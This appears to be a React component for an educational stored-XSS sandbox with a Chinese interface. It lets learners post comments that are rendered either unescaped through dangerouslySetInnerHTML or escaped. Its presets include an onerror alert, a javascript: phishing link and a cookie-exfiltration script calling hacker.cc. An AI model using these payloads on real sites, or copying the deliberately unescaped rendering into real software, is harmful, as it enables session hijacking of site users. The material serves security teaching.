import React, { useState } from 'react';
import { Code2, ShieldCheck, ShieldAlert, Send, Sparkles, Terminal, AlertCircle, Cookie, Radio } from 'lucide-react';

export default function XssSandbox() {
  const [author, setAuthor] = useState('Attacker_007');
  const [content, setContent] = useState('<img src="x" onerror="alert(\'Cookie遭竊!\')" />');
  const [isSecureMode, setIsSecureMode] = useState(false);
  const [comments, setComments] = useState([
    { id: 1, author: 'Alice', content: '這個網站做得真棒！學習資安很直覺。', isSafe: true },
    { id: 2, author: 'Bob', content: '請問下次期末考會考 OWASP Top 10 的哪幾題？', isSafe: true }
  ]);
  const [hackerIntercepted, setHackerIntercepted] = useState(null);
  const [popupAlert, setPopupAlert] = useState(null);

  const presets = [
    {
      label: '圖片 onerror 彈窗',
      payload: '<img src="x" onerror="alert(\'XSS 觸發!\')" />',
      desc: '最常用的 XSS 測試向量'
    },
    {
      label: '偽冒釣魚連結',
      payload: '<a href="javascript:alert(\'已劫持至釣魚頁面!\')" class="text-rose-400 underline font-bold">👉 點我領取高額獎學金</a>',
      desc: '誘騙使用者點擊執行 JS'
    },
    {
      label: 'Cookie 竊聽 Payload',
      payload: '<script>fetch("//hacker.cc/steal?c=" + document.cookie)</script>',
      desc: '模擬 Session 劫持與 Token 外流'
    }
  ];

  const handlePostComment = (e) => {
    e.preventDefault();
    if (!content.trim()) return;

    const newComment = {
      id: Date.now(),
      author: author.trim() || 'Anonymous',
      content: content,
      isSafe: isSecureMode
    };

    setComments((prev) => [newComment, ...prev]);

    // Check if attack succeeds
    const containsHtmlTag = /<[a-z][\s\S]*>/i.test(content);
    if (!isSecureMode && containsHtmlTag) {
      setPopupAlert({
        title: '⚠️ 瀏覽器執行了注入的 JavaScript！',
        message: `在 DOM 渲染時，惡意代碼被瀏覽器無條件當作腳本執行：\n${content}`,
        cookie: 'session_token=usr_alice_87f21a9c33e'
      });

      setHackerIntercepted({
        timestamp: new Date().toLocaleTimeString(),
        payload: content,
        stolenCookie: 'session_token=usr_alice_87f21a9c33e; role=student_vip',
        victimIp: '192.168.1.105'
      });
    } else {
      setPopupAlert(null);
    }
  };

  const handleClear = () => {
    setComments([
      { id: 1, author: 'Alice', content: '這個網站做得真棒！學習資安很直覺。', isSafe: true },
      { id: 2, author: 'Bob', content: '請問下次期末考會考 OWASP Top 10 的哪幾題？', isSafe: true }
    ]);
    setHackerIntercepted(null);
    setPopupAlert(null);
  };

  return (
    <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-2xl space-y-6">
      {/* Top Banner */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 pb-4 border-b border-slate-800">
        <div>
          <div className="flex items-center gap-2">
            <Code2 className="w-5 h-5 text-purple-400" />
            <h3 className="text-lg font-bold text-white">XSS 跨站腳本動態模擬沙盒 (Stored XSS)</h3>
          </div>
          <p className="text-xs text-slate-400 mt-1">
            模擬留言板場景。若伺服器未對留言進行 HTML 轉義，惡意 JavaScript 會直接在所有瀏覽該留言的受害者瀏覽器上執行。
          </p>
        </div>

        {/* Defense Switch */}
        <div className="flex items-center gap-3 bg-slate-950 px-4 py-2 rounded-lg border border-slate-700">
          <span className="text-xs font-medium text-slate-300">DOM 渲染防禦：</span>
          <button
            onClick={() => {
              setIsSecureMode(!isSecureMode);
              setPopupAlert(null);
            }}
            className={`flex items-center gap-1.5 px-3 py-1 rounded-md text-xs font-semibold transition-all ${
              isSecureMode 
                ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/50' 
                : 'bg-rose-500/20 text-rose-300 border border-rose-500/50'
            }`}
          >
            {isSecureMode ? (
              <>
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                已轉義 (HTML Entity / textContent)
              </>
            ) : (
              <>
                <ShieldAlert className="w-3.5 h-3.5 text-rose-400" />
                未防禦 (InnerHTML 原始渲染)
              </>
            )}
          </button>
        </div>
      </div>

      {/* Preset Quick Buttons */}
      <div className="space-y-2">
        <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">注入常用 XSS 攻擊語句：</span>
        <div className="flex flex-wrap gap-2">
          {presets.map((preset, idx) => (
            <button
              key={idx}
              onClick={() => setContent(preset.payload)}
              className="px-3 py-1.5 bg-slate-800/80 hover:bg-slate-700 border border-slate-700 hover:border-purple-500/50 rounded-lg text-xs text-slate-200 transition-colors flex items-center gap-1.5"
            >
              <Sparkles className="w-3 h-3 text-purple-400" />
              <span className="font-semibold text-purple-300">{preset.label}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Mock Comment Form */}
      <form onSubmit={handlePostComment} className="bg-slate-950/60 p-4 rounded-xl border border-slate-800 space-y-3">
        <div className="grid grid-cols-1 sm:grid-cols-4 gap-3">
          <div>
            <label className="text-xs font-medium text-slate-300">暱稱 (Author)</label>
            <input
              type="text"
              value={author}
              onChange={(e) => setAuthor(e.target.value)}
              className="w-full mt-1 px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono"
            />
          </div>
          <div className="sm:col-span-3">
            <label className="text-xs font-medium text-slate-300">留言內容 (支援 HTML / 潛在 XSS Payload)</label>
            <input
              type="text"
              value={content}
              onChange={(e) => setContent(e.target.value)}
              className="w-full mt-1 px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-purple-300 font-mono focus:border-purple-400 focus:outline-none"
            />
          </div>
        </div>

        <div className="flex items-center justify-between pt-1">
          <button
            type="button"
            onClick={handleClear}
            className="text-xs text-slate-400 hover:text-slate-200 underline"
          >
            重設留言板
          </button>
          <button
            type="submit"
            className="px-5 py-2 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white font-medium text-xs rounded-lg transition-all flex items-center gap-1.5 shadow-lg active:scale-95"
          >
            <Send className="w-3.5 h-3.5" />
            發表留言 (觸發 DOM 渲染)
          </button>
        </div>
      </form>

      {/* Simulated Browser Alert Modal */}
      {popupAlert && (
        <div className="bg-rose-950/60 border-2 border-rose-500 p-4 rounded-xl animate-bounce space-y-2">
          <div className="flex items-center justify-between">
            <span className="flex items-center gap-2 font-bold text-rose-300 text-sm">
              <AlertCircle className="w-5 h-5 text-rose-400" />
              {popupAlert.title}
            </span>
            <button
              onClick={() => setPopupAlert(null)}
              className="text-xs bg-rose-900/80 hover:bg-rose-800 text-rose-200 px-2 py-0.5 rounded"
            >
              關閉警告
            </button>
          </div>
          <pre className="text-xs font-mono text-rose-200 bg-black/60 p-2.5 rounded whitespace-pre-wrap">
            {popupAlert.message}
          </pre>
          <div className="flex items-center gap-2 text-xs text-amber-300 pt-1">
            <Cookie className="w-4 h-4 text-amber-400" />
            <span>讀取到當前網頁私密 Cookie：</span>
            <code className="bg-black/50 px-2 py-0.5 rounded font-mono text-emerald-400">{popupAlert.cookie}</code>
          </div>
        </div>
      )}

      {/* Hacker C2 Monitor Simulation */}
      {hackerIntercepted && (
        <div className="bg-black/80 border border-rose-800/80 rounded-xl p-4 font-mono text-xs space-y-2">
          <div className="flex items-center justify-between text-rose-400 border-b border-rose-900/60 pb-2">
            <span className="flex items-center gap-1.5 font-bold">
              <Radio className="w-4 h-4 text-rose-500 animate-pulse" />
              駭客遠端 C2 監聽伺服器日誌 (Exfiltration Listener)：
            </span>
            <span className="text-[11px] text-slate-400">{hackerIntercepted.timestamp}</span>
          </div>
          <div className="text-slate-300">
            [+] 攔截到來自受害受眾的 Session 憑證：
          </div>
          <div className="bg-slate-950 p-2.5 rounded border border-rose-950 text-emerald-400 text-[11px]">
            {hackerIntercepted.stolenCookie}
          </div>
          <p className="text-[11px] text-rose-300/80">
            * 提示：若網站後端有設置 <code className="text-white bg-slate-800 px-1">HttpOnly</code> 屬性，JavaScript 即使注入成功也無法讀取到該 Cookie！
          </p>
        </div>
      )}

      {/* Live Guestbook List */}
      <div className="bg-slate-950 rounded-xl p-4 border border-slate-800 space-y-3">
        <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center justify-between">
          <span>留言板展示區 (模擬前端渲染效果)</span>
          <span className="text-[11px] text-slate-400">共 {comments.length} 則留言</span>
        </div>

        <div className="space-y-2.5">
          {comments.map((c) => (
            <div key={c.id} className="bg-slate-900/80 p-3 rounded-lg border border-slate-800/80 space-y-1">
              <div className="flex items-center justify-between">
                <span className="font-semibold text-xs text-cyan-300 flex items-center gap-1.5">
                  👤 {c.author}
                </span>
                <span className={`text-[10px] px-2 py-0.5 rounded ${
                  c.isSafe ? 'bg-emerald-950 text-emerald-300 border border-emerald-800/50' : 'bg-rose-950 text-rose-300 border border-rose-800/50'
                }`}>
                  {c.isSafe ? '安全轉義輸出' : '未過濾 HTML'}
                </span>
              </div>

              {c.isSafe ? (
                // Safe text rendering
                <div className="text-xs text-slate-200 font-mono whitespace-pre-wrap">
                  {c.content}
                </div>
              ) : (
                // Simulated unescaped rendering
                <div
                  className="text-xs text-slate-200 font-mono break-all"
                  dangerouslySetInnerHTML={{ __html: c.content }}
                />
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

